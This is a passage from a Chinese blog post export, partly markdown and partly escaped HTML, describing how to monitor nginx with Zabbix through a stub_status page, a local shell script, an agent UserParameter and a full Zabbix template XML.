服务器zabbix_get数据检测\n\n此步骤可以跳过，但最好还是测试一下，通过此命令检测客户端配置是否正确\n```bash\n# /usr/bin/zabbix_get -s agentd机器ip -k 'nginx.status[accepts]'\n9570756\n# /usr/bin/zabbix_get -s agentd机器ip -k 'nginx.status[ping]'\n1\n```\n\n### zabbix web端配置\n**导入Template App NGINX模板**\n模板已经写好，位于文章末尾。\n\n**Link NGINX模板**\n到了最后一个阶段，登陆zabbix管理端，link模板到nginx服务器：configuration->hosts->点击nginx所在服务器->点击template->Link new templates输入\"Template App NGINX\"->Add->最后点击update。\n\n<br/>\n\n---\n\n### Template App NGINX模板\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<zabbix_export>\n    <version>2.0</version>\n    <date>2016-10-6T01:29:50Z</date>\n    <groups>\n        <group>\n            <name>Templates</name>\n        </group>\n    </groups>\n    <templates>\n        <template>\n            <template>Template App NGINX</template>\n            <name>Template App NGINX</name>\n            <description></description>\n            <groups>\n                <group>\n                    <name>Templates</name>\n                </group>\n            </groups>\n            <applications>\n                <application>\n                    <name>nginx</name>\n                </application>\n            </applications>\n            <items>\n                <item>\n                    <name>nginx status connections active</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[active]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>active</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status connections reading</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[reading]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>reading</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status connections waiting</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[waiting]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>waiting</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status connections writing</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[writing]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>writing</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status PING</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[ping]</key>\n                    <delay>60</delay>\n                    <history>30</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>is live</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap>\n                        <name>Service state</name>\n                    </valuemap>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status server accepts</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[accepts]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>1</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>accepts</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status server handled</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[handled]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>1</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>handled</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status server requests</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[requests]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>1</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>requests</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n            </items>\n            <discovery_rules/>\n            <macros/>\n            <templates/>\n            <screens/>\n        </template>\n    </templates>\n    <triggers>\n        <trigger>\n            <expression>{Template App NGINX:nginx.status[ping].last()}=0</expression>\n            <name>nginx was down!</name>\n            <url/>\n            <status>0</status>\n            <priority>4</priority>\n            <description>NGINX进程数：0，请注意</description>\n            <type>0</type>\n            <dependencies/>\n        </trigger>\n    </triggers>\n    <graphs>\n        <graph>\n            <name>nginx status connections</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>00C800</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[active]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>1</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[reading]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>2</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>0000C8</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[waiting]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>3</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C800C8</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[writing]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n        <graph>\n            <name>nginx status server</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>00C800</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[accepts]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>1</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[handled]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>2</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>0000C8</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[requests]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n    </graphs>\n</zabbix_export>\n\n```","slug":"zabbix监控nginx","published":1,"updated":"2016-11-18T01:17:04.158Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruld4003fgwtmuo2vtla9","content":"<blockquote>\n<p>zabbix&#x76D1;&#x63A7;nginx&#xFF0C;&#x9996;&#x5148;&#x9700;&#x8981;&#x914D;&#x7F6E;ngx_status</p>\n</blockquote>\n<h3 id=\"&#x542F;&#x7528;nginx-status&#x914D;&#x7F6E;\"><a href=\"#&#x542F;&#x7528;nginx-status&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"&#x542F;&#x7528;nginx status&#x914D;&#x7F6E;\"></a>&#x542F;&#x7528;nginx status&#x914D;&#x7F6E;</h3><p>&#x5728;&#x9ED8;&#x8BA4;&#x4E3B;&#x673A;&#x91CC;&#x9762;&#x52A0;&#x4E0A;location&#x6216;&#x8005;&#x4F60;&#x5E0C;&#x671B;&#x80FD;&#x8BBF;&#x95EE;&#x5230;&#x7684;&#x4E3B;&#x673A;&#x91CC;&#x9762;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server {</span><br><span class=\"line\">    listen  *:80 default_server;</span><br><span class=\"line\">    server_name _;</span><br><span class=\"line\">    location /nginx-status </span><br><span class=\"line\">    {</span><br><span class=\"line\">        stub_status on;</span><br><span class=\"line\">        access_<span class=\"built_in\">log</span> off;</span><br><span class=\"line\">        <span class=\"comment\">#allow 127.0.0.1;</span></span><br><span class=\"line\">        <span class=\"comment\">#deny all;</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<h3 id=\"&#x91CD;&#x542F;nginx\"><a href=\"#&#x91CD;&#x542F;nginx\" class=\"headerlink\" title=\"&#x91CD;&#x542F;nginx\"></a>&#x91CD;&#x542F;nginx</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service nginx restart</span><br></pre></td></tr></table></figure>\n<h3 id=\"&#x6253;&#x5F00;status&#x9875;&#x9762;\"><a href=\"#&#x6253;&#x5F00;status&#x9875;&#x9762;\" class=\"headerlink\" title=\"&#x6253;&#x5F00;status&#x9875;&#x9762;\"></a>&#x6253;&#x5F00;status&#x9875;&#x9762;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;nginx&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#x4E0D;&#x662F;80 curl http://ip:port/nginx-status</span></span><br><span class=\"line\"><span class=\"comment\"># curl http://127.0.0.1/nginx-status</span></span><br><span class=\"line\">Active connections: 11921 </span><br><span class=\"line\">server accepts handled requests</span><br><span class=\"line\"> 11989 11989 11991 </span><br><span class=\"line\">Reading: 0 Writing: 7 Waiting: 42</span><br></pre></td></tr></table></figure>\n<h3 id=\"nginx-status&#x8BE6;&#x89E3;\"><a href=\"#nginx-status&#x8BE6;&#x89E3;\" class=\"headerlink\" title=\"nginx status&#x8BE6;&#x89E3;\"></a>nginx status&#x8BE6;&#x89E3;</h3><p>active connections &#x2013; &#x6D3B;&#x8DC3;&#x7684;&#x8FDE;&#x63A5;&#x6570;&#x91CF;<br>server accepts handled requests &#x2014; &#x603B;&#x5171;&#x5904;&#x7406;&#x4E86;11989&#x4E2A;&#x8FDE;&#x63A5; , &#x6210;&#x529F;&#x521B;&#x5EFA;11989&#x6B21;&#x63E1;&#x624B;, &#x603B;&#x5171;&#x5904;&#x7406;&#x4E86;11991&#x4E2A;&#x8BF7;&#x6C42;<br>reading &#x2014; &#x8BFB;&#x53D6;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8FDE;&#x63A5;&#x6570;.<br>writing &#x2014; &#x54CD;&#x5E94;&#x6570;&#x636E;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x6570;&#x91CF;<br>waiting &#x2014; &#x5F00;&#x542F; keep-alive &#x7684;&#x60C5;&#x51B5;&#x4E0B;,&#x8FD9;&#x4E2A;&#x503C;&#x7B49;&#x4E8E; active &#x2013; (reading+writing), &#x610F;&#x601D;&#x5C31;&#x662F; Nginx &#x5DF2;&#x7ECF;&#x5904;&#x7406;&#x5B8C;&#x6B63;&#x5728;&#x7B49;&#x5019;&#x4E0B;&#x4E00;&#x6B21;&#x8BF7;&#x6C42;&#x6307;&#x4EE4;&#x7684;&#x9A7B;&#x7559;&#x8FDE;&#x63A5;.</p>\n<p><br></p>\n<hr>\n<h3 id=\"zabbix&#x5BA2;&#x6237;&#x7AEF;&#x914D;&#x7F6E;\"><a href=\"#zabbix&#x5BA2;&#x6237;&#x7AEF;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"zabbix&#x5BA2;&#x6237;&#x7AEF;&#x914D;&#x7F6E;\"></a>zabbix&#x5BA2;&#x6237;&#x7AEF;&#x914D;&#x7F6E;</h3><p>&#x5B89;&#x88C5;zabbix agent&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x5E76;&#x4FEE;&#x6539;zabbix_agentd.conf&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /etc/zabbix/zabbix_agentd.conf</span></span><br><span class=\"line\"></span><br><span class=\"line\">EnableRemoteCommands=1  &#x6765;&#x81F3;zabbix&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x88AB;&#x6267;&#x884C;</span><br><span class=\"line\">Server=zabbix_server_IP  zabbix&#x670D;&#x52A1;&#x5668;ip&#x5730;&#x5740;</span><br><span class=\"line\">ServerActive=zabbix_server_IP  &#x4E3B;&#x52A8;&#x5411;zabbix server&#x53D1;&#x9001;&#x76D1;&#x63A7;&#x5185;&#x5BB9;</span><br><span class=\"line\">Hostname=name  name&#x914D;&#x7F6E;&#x7684;&#x5185;&#x5BB9;&#x8981;&#x548C;zabbix&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x7684;Host name&#x4E00;&#x81F4;</span><br><span class=\"line\">UnsafeUserParameters=1  &#x662F;&#x5426;&#x542F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;key,zabbix&#x76D1;&#x63A7;mysql&#x3001;tomcat&#x7B49;&#x6570;&#x636E;&#x65F6;&#x9700;&#x8981;&#x81EA;&#x5B9A;&#x4E49;key</span><br></pre></td></tr></table></figure></p>\n<p>&#x7F16;&#x5199;&#x5BA2;&#x6237;&#x7AEF;&#x811A;&#x672C;ngx_status.sh, &#x5B58;&#x653E;/etc/zabbix/scripts&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x8D4B;&#x4E88;&#x6267;&#x884C;&#x6743;&#x9650;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">HOST=<span class=\"string\">&quot;127.0.0.1&quot;</span></span><br><span class=\"line\">PORT=<span class=\"string\">&quot;80&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x68C0;&#x6D4B;nginx&#x8FDB;&#x7A0B;&#x662F;&#x5426;&#x5B58;&#x5728;</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> ping {</span><br><span class=\"line\">    /sbin/pidof nginx | wc <span class=\"_\">-l</span> </span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\"># &#x68C0;&#x6D4B;nginx&#x6027;&#x80FD;</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> active {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| grep <span class=\"string\">&apos;Active&apos;</span> | awk <span class=\"string\">&apos;{print $NF}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> reading {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| grep <span class=\"string\">&apos;Reading&apos;</span> | awk <span class=\"string\">&apos;{print $2}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> writing {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| grep <span class=\"string\">&apos;Writing&apos;</span> | awk <span class=\"string\">&apos;{print $4}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> waiting {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| grep <span class=\"string\">&apos;Waiting&apos;</span> | awk <span class=\"string\">&apos;{print $6}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> accepts {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| awk NR==3 | awk <span class=\"string\">&apos;{print $1}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> handled {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| awk NR==3 | awk <span class=\"string\">&apos;{print $2}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> requests {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| awk NR==3 | awk <span class=\"string\">&apos;{print $3}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\"># &#x6267;&#x884C;function</span></span><br><span class=\"line\"><span class=\"variable\">$1</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x5C06;&#x81EA;&#x5B9A;&#x4E49;&#x7684;UserParameter&#x52A0;&#x5165;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x542F;agentd.<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /etc/zabbix/zabbix_agentd.d/userparameter_mysql.conf</span></span><br><span class=\"line\">UserParameter=nginx.status[*],/etc/zabbix/scripts/ngx_status.sh <span class=\"variable\">$1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#service zabbix-agent restart</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x670D;&#x52A1;&#x5668;zabbix-get&#x6570;&#x636E;&#x68C0;&#x6D4B;\"><a href=\"#&#x670D;&#x52A1;&#x5668;zabbix-get&#x6570;&#x636E;&#x68C0;&#x6D4B;\" class=\"headerlink\" title=\"&#x670D;&#x52A1;&#x5668;zabbix_get&#x6570;&#x636E;&#x68C0;&#x6D4B;\"></a>&#x670D;&#x52A1;&#x5668;zabbix_get&#x6570;&#x636E;&#x68C0;&#x6D4B;</h3><p>&#x6B64;&#x6B65;&#x9AA4;&#x53EF;&#x4EE5;&#x8DF3;&#x8FC7;&#xFF0C;&#x4F46;&#x6700;&#x597D;&#x8FD8;&#x662F;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#xFF0C;&#x901A;&#x8FC7;&#x6B64;&#x547D;&#x4EE4;&#x68C0;&#x6D4B;&#x5BA2;&#x6237;&#x7AEF;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># /usr/bin/zabbix_get -s agentd&#x673A;&#x5668;ip -k &apos;nginx.status[accepts]&apos;</span></span><br><span class=\"line\">9570756</span><br><span class=\"line\"><span class=\"comment\"># /usr/bin/zabbix_get -s agentd&#x673A;&#x5668;ip -k &apos;nginx.status[ping]&apos;</span></span><br><span class=\"line\">1</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"zabbix-web&#x7AEF;&#x914D;&#x7F6E;\"><a href=\"#zabbix-web&#x7AEF;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"zabbix web&#x7AEF;&#x914D;&#x7F6E;\"></a>zabbix web&#x7AEF;&#x914D;&#x7F6E;</h3><p><strong>&#x5BFC;&#x5165;Template App NGINX&#x6A21;&#x677F;</strong><br>&#x6A21;&#x677F;&#x5DF2;&#x7ECF;&#x5199;&#x597D;&#xFF0C;&#x4F4D;&#x4E8E;&#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x3002;</p>\n<p><strong>Link 